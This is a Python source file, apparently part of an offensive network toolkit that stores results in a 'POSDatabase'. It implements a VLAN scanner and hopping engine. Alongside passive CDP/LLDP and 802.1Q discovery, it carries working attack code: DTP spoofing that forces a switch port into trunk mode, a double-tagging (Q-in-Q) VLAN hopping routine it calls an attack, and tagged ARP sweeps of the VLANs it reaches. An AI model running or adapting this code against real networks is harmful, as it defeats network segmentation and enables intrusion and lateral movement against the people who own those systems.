"""
VLAN Scanner & Hopping Engine
─────────────────────────────
Discovers active VLANs on the network via multiple methods:
  1. 802.1Q tagged frame sniffing (Dot1Q layer)
  2. CDP (Cisco Discovery Protocol) frame parsing
  3. LLDP (Link Layer Discovery Protocol) frame parsing
  4. DTP (Dynamic Trunking Protocol) spoofing to force trunk mode
  5. Double-tagging (Q-in-Q) for VLAN hopping across native VLAN
  6. ARP sweep per discovered VLAN to map hosts

Results are persisted in the POSDatabase vlans table.
"""

import time
import struct
import socket
import threading
from datetime import datetime

from scapy.all import (
    Ether, Dot1Q, ARP, IP, ICMP, Raw, sniff, sendp, conf
)

from .config import log


class VLANScanner:
    """
    Discover and enumerate VLANs via passive sniffing, protocol parsing,
    and active VLAN hopping techniques.
    """

    def __init__(self, interface, db=None, native_vlan=1, sniff_timeout=60):
        self.interface = interface
        self.db = db
        self.native_vlan = native_vlan
        self.sniff_timeout = sniff_timeout

        self._running = False
        self._sniff_thread = None
        self._lock = threading.Lock()

        # Discovered data
        self._vlans = {}          # vlan_id -> {name, ip_range, gateway, ...}
        self._cdp_devices = []    # list of CDP device info dicts
        self._lldp_devices = []   # list of LLDP device info dicts
        self._topology = {}       # switch_name -> {ports, vlans, platform}
        self._vlan_hosts = {}     # vlan_id -> [list of discovered host IPs]
        self._dtp_spoofed = False
        self._packets_processed = 0

    # ─── Lifecycle ───────────────────────────────────────────────────────────

    def start(self):
        """Start passive VLAN discovery via frame sniffing."""
        if self._running:
            log.warning("VLANScanner already running")
            return

        self._running = True
        log.info(f"VLANScanner starting on {self.interface} "
                 f"(timeout={self.sniff_timeout}s)")

        self._sniff_thread = threading.Thread(
            target=self._sniff_loop, daemon=True
        )
        self._sniff_thread.start()

    def stop(self):
        """Stop VLAN scanner and persist results."""
        self._running = False

        if self._sniff_thread and self._sniff_thread.is_alive():
            self._sniff_thread.join(timeout=5)

        # Persist discovered VLANs to database
        self._persist_vlans()

        log.info(f"VLANScanner stopped: {len(self._vlans)} VLANs discovered, "
                 f"{self._packets_processed} packets processed")

    # ─── Discovery Methods ───────────────────────────────────────────────────

    def discover_vlans(self, timeout=None):
        """
        Run full VLAN discovery: sniff for tagged frames, parse CDP/LLDP,
        and optionally perform DTP spoofing.

        Args:
            timeout: Override sniff timeout (seconds)

        Returns:
            Dict of discovered VLANs {vlan_id: info_dict}
        """
        duration = timeout or self.sniff_timeout
        self._running = True

        log.info(f"Running VLAN discovery for {duration}s...")

        try:
            sniff(
                iface=self.interface,
                prn=self._packet_handler,
                store=0,
                timeout=duration,
                stop_filter=lambda x: not self._running
            )
        except Exception as e:
            log.error(f"VLAN sniff error: {e}")

        self._running = False
        self._persist_vlans()

        log.info(f"Discovery complete: {len(self._vlans)} VLANs found")
        return dict(self._vlans)

    def hop_vlan(self, target_vlan, method="double_tag"):
        """
        Attempt to hop into a target VLAN using the specified method.

        Args:
            target_vlan: VLAN ID to hop into
            method: 'double_tag' (Q-in-Q) or 'dtp' (DTP spoofing)

        Returns:
            True if hop attempt was sent, False on error
        """
        if method == "double_tag":
            return self._double_tag_hop(target_vlan)
        elif method == "dtp":
            return self.dtp_spoof()
        else:
            log.error(f"Unknown VLAN hop method: {method}")
            return False

    def dtp_spoof(self):
        """
        Send DTP Desirable frames to force the switch port into trunk mode.
        This allows access to all VLANs on the trunk.

        Returns:
            True if DTP frames were sent successfully
        """
        log.info("Sending DTP Desirable frames to force trunk mode...")

        try:
            # DTP frame: dst=01:00:0c:cc:cc:cc, ethertype=0x2004
            # DTP payload: version=1, domain='', status=desirable(0x03)
            dtp_dst = "01:00:0c:cc:cc:cc"

            # Build DTP Desirable payload
            # Type: 0x0001 (Domain), Length, Value
            # Type: 0x0002 (Status), Length, Value=0x03 (Desirable)
            # Type: 0x0003 (DTP Type), Length, Value=0xa5 (802.1Q)
            # Type: 0x0004 (Neighbor), Length, Value=MAC
            dtp_domain = struct.pack("!HH", 0x0001, 5) + b"\x00"
            dtp_status = struct.pack("!HH", 0x0002, 5) + b"\x03"
            dtp_type = struct.pack("!HH", 0x0003, 5) + b"\xa5"

            # Get interface MAC for neighbor field
            iface_mac = self._get_interface_mac()
            mac_bytes = bytes.fromhex(iface_mac.replace(":", ""))
            dtp_neighbor = struct.pack("!HH", 0x0004, 10) + mac_bytes

            dtp_payload = b"\x01" + dtp_domain + dtp_status + dtp_type + dtp_neighbor

            # Build the frame
            frame = (
                Ether(dst=dtp_dst, type=0x2004) /
                Raw(load=dtp_payload)
            )

            # Send multiple DTP frames
            for _ in range(5):
                if not self._running and not self._dtp_spoofed:
                    pass  # Send regardless on explicit call
                sendp(frame, iface=self.interface, verbose=False)
                time.sleep(1)

            self._dtp_spoofed = True
            log.info("DTP Desirable frames sent - switch may enter trunk mode")
            return True

        except Exception as e:
            log.error(f"DTP spoof failed: {e}")
            return False

    def arp_scan_vlan(self, vlan_id, ip_range=None):
        """
        Send ARP who-has requests tagged with a specific VLAN ID.

        Args:
            vlan_id: VLAN to tag frames with
            ip_range: IP range to scan (e.g., '192.168.10.0/24')
                      If None, uses the VLAN's known IP range.

        Returns:
            List of responding host IPs
        """
        if ip_range is None:
            vlan_info = self._vlans.get(vlan_id, {})
            ip_range = vlan_info.get("ip_range")
            if not ip_range:
                log.warning(f"No IP range known for VLAN {vlan_id}")
                return []

        hosts = self._parse_cidr(ip_range)
        discovered = []

        log.info(f"ARP scanning VLAN {vlan_id} ({ip_range}, "
                 f"{len(hosts)} hosts)...")

        for host_ip in hosts:
            if not self._running:
                break

            try:
                # Build tagged ARP frame
                frame = (
                    Ether(dst="ff:ff:ff:ff:ff:ff") /
                    Dot1Q(vlan=vlan_id) /
                    ARP(pdst=host_ip, op="who-has")
                )
                sendp(frame, iface=self.interface, verbose=False)
            except Exception:
                pass

            # Rate limit
            time.sleep(0.01)

        # Collect responses via brief sniff
        try:
            responses = sniff(
                iface=self.interface,
                filter="arp",
                timeout=5,
                store=1
            )
            for pkt in responses:
                if pkt.haslayer(ARP) and pkt[ARP].op == 2:  # is-at
                    src_ip = pkt[ARP].psrc
                    if src_ip not in discovered:
                        discovered.append(src_ip)
        except Exception as e:
            log.debug(f"ARP response sniff error: {e}")

        with self._lock:
            self._vlan_hosts[vlan_id] = discovered

        log.info(f"VLAN {vlan_id} ARP scan: {len(discovered)} hosts found")
        return discovered

    # ─── Getters ─────────────────────────────────────────────────────────────

    def get_vlans(self):
        """Return all discovered VLANs as a dict {vlan_id: info}."""
        with self._lock:
            return dict(self._vlans)

    def get_topology(self):
        """Return discovered network topology from CDP/LLDP data."""
        with self._lock:
            return {
                "switches": dict(self._topology),
                "cdp_devices": list(self._cdp_devices),
                "lldp_devices": list(self._lldp_devices),
                "vlans": dict(self._vlans),
                "vlan_hosts": dict(self._vlan_hosts),
            }

    def get_stats(self):
        """Return scanner statistics."""
        return {
            "running": self._running,
            "vlans_discovered": len(self._vlans),
            "cdp_devices": len(self._cdp_devices),
            "lldp_devices": len(self._lldp_devices),
            "switches": len(self._topology),
            "dtp_spoofed": self._dtp_spoofed,
            "packets_processed": self._packets_processed,
            "vlan_hosts_total": sum(len(v) for v in self._vlan_hosts.values()),
        }

    # ─── Internal Sniff Logic ────────────────────────────────────────────────

    def _sniff_loop(self):
        """Main sniff loop running in background thread."""
        try:
            sniff(
                iface=self.interface,
                prn=self._packet_handler,
                store=0,
                timeout=self.sniff_timeout,
                stop_filter=lambda x: not self._running
            )
        except Exception as e:
            log.error(f"VLANScanner sniff error: {e}")
        finally:
            self._running = False

    def _packet_handler(self, pkt):
        """Process each sniffed packet for VLAN/CDP/LLDP/DTP info."""
        self._packets_processed += 1

        # Check for 802.1Q tagged frames
        if pkt.haslayer(Dot1Q):
            self._process_dot1q(pkt)

        # Check for CDP frames (dst=01:00:0c:cc:cc:cc, SNAP)
        if pkt.haslayer(Ether):
            eth = pkt[Ether]
            if eth.dst == "01:00:0c:cc:cc:cc":
                self._process_cdp(pkt)
            # Check for LLDP frames (ethertype 0x88CC)
            elif eth.type == 0x88CC:
                self._process_lldp(pkt)
            # Check for DTP frames (ethertype 0x2004)
            elif eth.type == 0x2004:
                self._process_dtp(pkt)

    def _process_dot1q(self, pkt):
        """Extract VLAN ID from 802.1Q tagged frame."""
        dot1q = pkt[Dot1Q]
        vlan_id = dot1q.vlan

        with self._lock:
            if vlan_id not in self._vlans:
                self._vlans[vlan_id] = {
                    "vlan_id": vlan_id,
                    "name": f"VLAN-{vlan_id}",
                    "ip_range": None,
                    "gateway": None,
                    "native": 1 if vlan_id == self.native_vlan else 0,
                    "discovery_method": "802.1Q",
                    "switch_name": None,
                    "switch_port": None,
                    "first_seen": datetime.now().isoformat(timespec="seconds"),
                    "last_seen": datetime.now().isoformat(timespec="seconds"),
                }
                log.info(f"Discovered VLAN {vlan_id} via 802.1Q tagged frame")
            else:
                self._vlans[vlan_id]["last_seen"] = (
                    datetime.now().isoformat(timespec="seconds")
                )

            # Try to extract IP range from ARP within tagged frame
            if pkt.haslayer(ARP):
                arp = pkt[ARP]
                src_ip = arp.psrc
                if src_ip and src_ip != "0.0.0.0":
                    parts = src_ip.split(".")
                    if len(parts) == 4:
                        guessed_range = f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
                        if not self._vlans[vlan_id]["ip_range"]:
                            self._vlans[vlan_id]["ip_range"] = guessed_range

    def _process_cdp(self, pkt):
        """Parse CDP frame to extract device, platform, and VLAN info."""
        try:
            # CDP frames use SNAP encapsulation after Ethernet
            # Raw payload after LLC/SNAP headers
            if not pkt.haslayer(Raw):
                return

            raw_data = bytes(pkt[Raw])

            # Skip LLC/SNAP if present: look for CDP version byte
            # CDP starts with version (0x01 or 0x02) then TTL
            cdp_offset = 0
            if len(raw_data) < 4:
                return

            # Attempt to find CDP header
            # Format: Version(1) + TTL(1) + Checksum(2) + TLVs
            version = raw_data[cdp_offset]
            if version not in (0x01, 0x02):
                # Try skipping SNAP header (8 bytes)
                cdp_offset = 8
                if cdp_offset + 4 > len(raw_data):
                    return
                version = raw_data[cdp_offset]
                if version not in (0x01, 0x02):
                    return

            device_info = {
                "device_id": None,
                "platform": None,
                "vlan_id": None,
                "port_id": None,
                "native_vlan": None,
                "ip_address": None,
                "source_mac": pkt[Ether].src if pkt.haslayer(Ether) else None,
                "timestamp": datetime.now().isoformat(timespec="seconds"),
            }

            # Parse TLVs starting after version(1)+ttl(1)+checksum(2)
            offset = cdp_offset + 4
            while offset + 4 <= len(raw_data):
                tlv_type = struct.unpack("!H", raw_data[offset:offset + 2])[0]
                tlv_len = struct.unpack("!H", raw_data[offset + 2:offset + 4])[0]

                if tlv_len < 4 or offset + tlv_len > len(raw_data):
                    break

                tlv_value = raw_data[offset + 4:offset + tlv_len]

                # Type 0x0001: Device-ID
                if tlv_type == 0x0001:
                    device_info["device_id"] = tlv_value.decode(
                        errors="ignore").strip("\x00")
                # Type 0x0003: Port-ID
                elif tlv_type == 0x0003:
                    device_info["port_id"] = tlv_value.decode(
                        errors="ignore").strip("\x00")
                # Type 0x0006: Platform
                elif tlv_type == 0x0006:
                    device_info["platform"] = tlv_value.decode(
                        errors="ignore").strip("\x00")
                # Type 0x000a: Native VLAN
                elif tlv_type == 0x000a and len(tlv_value) >= 2:
                    device_info["native_vlan"] = struct.unpack(
                        "!H", tlv_value[:2])[0]
                # Type 0x0005: VLAN-ID (VTP Mgmt Domain sometimes encodes this)
                elif tlv_type == 0x0005:
                    pass  # VTP Management Domain name
                # Type 0x0001 already handled
                # Type 0x0002: Addresses
                elif tlv_type == 0x0002 and len(tlv_value) >= 8:
                    # Parse first address (typically IPv4)
                    try:
                        # num_addresses(4) + proto_type(1) + proto_len(1) + proto + addr_len(2) + addr
                        addr_offset = 4  # skip num_addresses
                        proto_type = tlv_value[addr_offset]
                        proto_len = tlv_value[addr_offset + 1]
                        addr_offset += 2 + proto_len
                        if addr_offset + 2 <= len(tlv_value):
                            addr_len = struct.unpack(
                                "!H", tlv_value[addr_offset:addr_offset + 2])[0]
                            addr_offset += 2
                            if addr_len == 4 and addr_offset + 4 <= len(tlv_value):
                                ip_bytes = tlv_value[addr_offset:addr_offset + 4]
                                device_info["ip_address"] = socket.inet_ntoa(ip_bytes)
                    except (struct.error, IndexError, OSError):
                        pass

                offset += tlv_len

            # Only record if we got meaningful data
            if device_info["device_id"] or device_info["platform"]:
                with self._lock:
                    self._cdp_devices.append(device_info)

                    # Update topology
                    name = device_info["device_id"] or "unknown"
                    if name not in self._topology:
                        self._topology[name] = {
                            "platform": device_info["platform"],
                            "ports": [],
                            "vlans": [],
                            "ip_address": device_info["ip_address"],
                        }
                    if device_info["port_id"]:
                        ports = self._topology[name]["ports"]
                        if device_info["port_id"] not in ports:
                            ports.append(device_info["port_id"])

                    # Register native VLAN from CDP
                    if device_info["native_vlan"]:
                        nvlan = device_info["native_vlan"]
                        if nvlan not in self._vlans:
                            self._vlans[nvlan] = {
                                "vlan_id": nvlan,
                                "name": f"Native-VLAN-{nvlan}",
                                "ip_range": None,
                                "gateway": device_info["ip_address"],
                                "native": 1,
                                "discovery_method": "CDP",
                                "switch_name": device_info["device_id"],
                                "switch_port": device_info["port_id"],
                                "first_seen": datetime.now().isoformat(timespec="seconds"),
                                "last_seen": datetime.now().isoformat(timespec="seconds"),
                            }
                        self.native_vlan = nvlan

                log.info(f"CDP device: {device_info['device_id']} "
                         f"({device_info['platform']}) "
                         f"port={device_info['port_id']} "
                         f"native_vlan={device_info['native_vlan']}")

        except Exception as e:
            log.debug(f"CDP parse error: {e}")

    def _process_lldp(self, pkt):
        """Parse LLDP frame (ethertype 0x88CC) to extract system info."""
        try:
            if not pkt.haslayer(Raw):
                raw_data = bytes(pkt.payload) if pkt.payload else b""
            else:
                raw_data = bytes(pkt[Raw])

            if len(raw_data) < 4:
                return

            device_info = {
                "system_name": None,
                "port_description": None,
                "management_address": None,
                "vlan_id": None,
                "chassis_id": None,
                "source_mac": pkt[Ether].src if pkt.haslayer(Ether) else None,
                "timestamp": datetime.now().isoformat(timespec="seconds"),
            }

            # Parse LLDP TLVs: type(7bits) + length(9bits) packed in 2 bytes
            offset = 0
            while offset + 2 <= len(raw_data):
                header = struct.unpack("!H", raw_data[offset:offset + 2])[0]
                tlv_type = (header >> 9) & 0x7F
                tlv_len = header & 0x01FF

                offset += 2
                if offset + tlv_len > len(raw_data):
                    break

                tlv_value = raw_data[offset:offset + tlv_len]

                # Type 0: End of LLDPDU
                if tlv_type == 0:
                    break
                # Type 1: Chassis ID
                elif tlv_type == 1 and tlv_len > 1:
                    subtype = tlv_value[0]
                    chassis_data = tlv_value[1:]
                    if subtype == 4:  # MAC address
                        if len(chassis_data) >= 6:
                            device_info["chassis_id"] = ":".join(
                                f"{b:02x}" for b in chassis_data[:6])
                    else:
                        device_info["chassis_id"] = chassis_data.decode(
                            errors="ignore").strip("\x00")
                # Type 2: Port ID
                elif tlv_type == 2 and tlv_len > 1:
                    device_info["port_description"] = tlv_value[1:].decode(
                        errors="ignore").strip("\x00")
                # Type 5: System Name
                elif tlv_type == 5:
                    device_info["system_name"] = tlv_value.decode(
                        errors="ignore").strip("\x00")
                # Type 8: Management Address
                elif tlv_type == 8 and tlv_len >= 6:
                    # addr_strlen(1) + subtype(1) + addr + iface_subtype + iface_num + oid_len
                    addr_len = tlv_value[0]
                    if addr_len >= 5 and tlv_value[1] == 1:  # IPv4
                        try:
                            ip_bytes = tlv_value[2:6]
                            device_info["management_address"] = socket.inet_ntoa(
                                ip_bytes)
                        except (OSError, struct.error):
                            pass
                # Type 127: Org-specific (check for 802.1Q VLAN)
                elif tlv_type == 127 and tlv_len >= 4:
                    # OUI (3 bytes) + subtype (1 byte)
                    oui = tlv_value[:3]
                    subtype = tlv_value[3]
                    # IEEE 802.1 OUI: 00-80-c2, subtype 3 = VLAN Name
                    if oui == b"\x00\x80\xc2" and subtype == 3:
                        if tlv_len >= 6:
                            vlan_id = struct.unpack(
                                "!H", tlv_value[4:6])[0]
                            device_info["vlan_id"] = vlan_id

                offset += tlv_len

            # Record if meaningful
            if device_info["system_name"] or device_info["chassis_id"]:
                with self._lock:
                    self._lldp_devices.append(device_info)

                    # Update topology
                    name = device_info["system_name"] or device_info["chassis_id"]
                    if name and name not in self._topology:
                        self._topology[name] = {
                            "platform": "LLDP",
                            "ports": [],
                            "vlans": [],
                            "ip_address": device_info["management_address"],
                        }

                    # Register discovered VLAN
                    if device_info["vlan_id"]:
                        vid = device_info["vlan_id"]
                        if vid not in self._vlans:
                            self._vlans[vid] = {
                                "vlan_id": vid,
                                "name": f"VLAN-{vid}",
                                "ip_range": None,
                                "gateway": device_info["management_address"],
                                "native": 0,
                                "discovery_method": "LLDP",
                                "switch_name": name,
                                "switch_port": device_info["port_description"],
                                "first_seen": datetime.now().isoformat(
                                    timespec="seconds"),
                                "last_seen": datetime.now().isoformat(
                                    timespec="seconds"),
                            }

                log.info(f"LLDP device: {device_info['system_name']} "
                         f"mgmt={device_info['management_address']} "
                         f"vlan={device_info['vlan_id']}")

        except Exception as e:
            log.debug(f"LLDP parse error: {e}")

    def _process_dtp(self, pkt):
        """Parse DTP frame to detect trunk negotiation."""
        log.debug("DTP frame detected - switch is negotiating trunk")

    # ─── VLAN Hopping ────────────────────────────────────────────────────────

    def _double_tag_hop(self, target_vlan):
        """
        Perform double-tagging (Q-in-Q) VLAN hopping attack.

        Sends frames with two 802.1Q tags:
          - Outer tag: native VLAN (stripped by first switch)
          - Inner tag: target VLAN (forwarded to target VLAN)

        Args:
            target_vlan: VLAN ID to hop into

        Returns:
            True if frames were sent
        """
        log.info(f"Double-tagging hop: native={self.native_vlan} -> "
                 f"target={target_vlan}")

        try:
            # Build Q-in-Q frame with ARP broadcast on target VLAN
            frame = (
                Ether(dst="ff:ff:ff:ff:ff:ff") /
                Dot1Q(vlan=self.native_vlan) /
                Dot1Q(vlan=target_vlan) /
                ARP(pdst="255.255.255.255", op="who-has")
            )

            # Send discovery frames
            for _ in range(3):
                sendp(frame, iface=self.interface, verbose=False)
                time.sleep(0.5)

            # Also send an ICMP probe with double tags
            icmp_frame = (
                Ether(dst="ff:ff:ff:ff:ff:ff") /
                Dot1Q(vlan=self.native_vlan) /
                Dot1Q(vlan=target_vlan) /
                IP(dst="255.255.255.255") /
                ICMP()
            )
            sendp(icmp_frame, iface=self.interface, verbose=False)

            # Register the target VLAN
            with self._lock:
                if target_vlan not in self._vlans:
                    self._vlans[target_vlan] = {
                        "vlan_id": target_vlan,
                        "name": f"VLAN-{target_vlan}",
                        "ip_range": None,
                        "gateway": None,
                        "native": 0,
                        "discovery_method": "double_tag_hop",
                        "switch_name": None,
                        "switch_port": None,
                        "first_seen": datetime.now().isoformat(timespec="seconds"),
                        "last_seen": datetime.now().isoformat(timespec="seconds"),
                    }

            log.info(f"Double-tag frames sent for VLAN {target_vlan}")
            return True

        except Exception as e:
            log.error(f"Double-tag hop failed: {e}")
            return False

    # ─── Helpers ─────────────────────────────────────────────────────────────

    def _get_interface_mac(self):
        """Get the MAC address of the interface."""
        try:
            path = f"/sys/class/net/{self.interface}/address"
            with open(path, "r") as f:
                return f.read().strip()
        except (IOError, OSError):
            return "00:11:22:33:44:55"

    def _parse_cidr(self, cidr):
        """Parse CIDR notation into list of host IPs (max /24 = 254 hosts)."""
        hosts = []
        try:
            if "/" not in cidr:
                return [cidr]
            base, prefix = cidr.split("/")
            prefix = int(prefix)
            parts = base.split(".")
            if len(parts) != 4:
                return []
            if prefix == 24:
                for i in range(1, 255):
                    hosts.append(f"{parts[0]}.{parts[1]}.{parts[2]}.{i}")
            elif prefix == 16:
                # Only scan first subnet for /16
                for i in range(1, 255):
                    hosts.append(f"{parts[0]}.{parts[1]}.{parts[2]}.{i}")
            else:
                # Default: just the base network /24
                for i in range(1, 255):
                    hosts.append(f"{parts[0]}.{parts[1]}.{parts[2]}.{i}")
        except (ValueError, IndexError):
            pass
        return hosts

    def _persist_vlans(self):
        """Persist all discovered VLANs to database."""
        if not self.db:
            return

        with self._lock:
            for vlan_id, info in self._vlans.items():
                try:
                    self.db.log_vlan(
                        vlan_id=vlan_id,
                        name=info.get("name"),
                        ip_range=info.get("ip_range"),
                        gateway=info.get("gateway"),
                        native=info.get("native", 0),
                        discovery_method=info.get("discovery_method"),
                        switch_name=info.get("switch_name"),
                        switch_port=info.get("switch_port"),
                    )
                except Exception as e:
                    log.debug(f"Failed to persist VLAN {vlan_id}: {e}")
